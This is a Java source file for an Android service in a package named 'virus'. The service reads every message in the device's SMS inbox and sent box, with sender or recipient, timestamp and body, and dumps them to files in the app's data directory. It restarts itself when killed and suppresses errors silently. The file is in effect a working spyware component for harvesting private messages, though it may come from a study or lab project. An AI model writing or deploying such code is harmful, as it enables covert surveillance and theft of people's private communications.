package com.example.virus.Services;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;

import java.io.PrintWriter;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.Locale;

public class SmsInfoService extends Service {
    public SmsInfoService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
       // throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate()
    {

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(checkPermission()) {
            String inboxFile = this.getApplicationInfo().dataDir + "/sms_inbox";
            dumpSMS(this, inboxFile, "inbox");

            String sentFile = this.getApplicationInfo().dataDir + "/sms_sent";
            dumpSMS(this, sentFile, "sent");
        }
        return Service.START_STICKY;
    }


    void dumpSMS(Context context, String file, String box) {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss", Locale.US);

        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/" + box), null, null, null, null);

        try {
            PrintWriter pw = new PrintWriter(file);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = null;
                    String date = null;
                    String body = null;

                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        switch (cursor.getColumnName(idx)) {
                            case "address":
                                address = cursor.getString(idx);
                                break;
                            case "date":
                                date = cursor.getString(idx);
                                break;
                            case "body":
                                body = cursor.getString(idx);
                        }
                    }

                    if (box.equals("inbox")) {
                        pw.println("From: " + address);
                    } else {
                        pw.println("To: " + address);
                    }

                    String dateString = formatter.format(new Date(Long.valueOf(date)));

                    pw.println("Date: " + dateString);

                    if (body != null) {
                        pw.println("Body: " + body.replace('\n', ' '));
                    } else {
                        pw.println("Body: ");
                    }

                    pw.println();
                } while (cursor.moveToNext());
            }
            pw.close();
            cursor.close();
        } catch (Exception e) {}
    }
    private boolean checkPermission()
    {
        String permission = android.Manifest.permission.RECEIVE_SMS;
        String permission2 = Manifest.permission.READ_SMS;
        int res = this.getBaseContext().checkCallingOrSelfPermission(permission);
        int res2 = this.getBaseContext().checkCallingOrSelfPermission(permission2);
        return (res == PackageManager.PERMISSION_GRANTED && res2 == PackageManager.PERMISSION_GRANTED);
    }
}
